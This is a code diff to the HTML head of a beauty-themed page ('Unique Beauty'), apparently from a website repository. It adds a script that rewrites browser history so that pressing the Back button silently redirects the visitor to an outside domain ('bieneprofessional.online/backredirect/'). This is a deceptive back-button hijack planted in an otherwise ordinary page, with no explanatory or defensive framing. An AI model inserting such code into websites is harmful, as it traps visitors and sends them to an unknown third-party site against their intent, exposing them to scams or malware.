@@ -46,6 +46,22 @@
             })(window,document,'script','dataLayer','GTM-NP93BPW');
         </script>
         <!-- End Google Tag Manager -->
+        <script type="text/javascript">
+            var newUrl = location.pathname + location.search;
+            
+            (function(window, location) {
+            history.replaceState(null, document.title, newUrl+"#!/backbutton");
+            history.pushState(null, document.title, newUrl);
+            window.addEventListener("popstate", function() {
+            if(location.hash === "#!/backbutton") {
+            history.replaceState(null, document.title, newUrl);
+            setTimeout(function(){
+            location.replace("https://bieneprofessional.online/backredirect/");
+            },0);
+            }
+            }, false);
+            }(window, location));
+        </script>
 	</head>
     <header>
         <h1>Unique Beauty</h1>
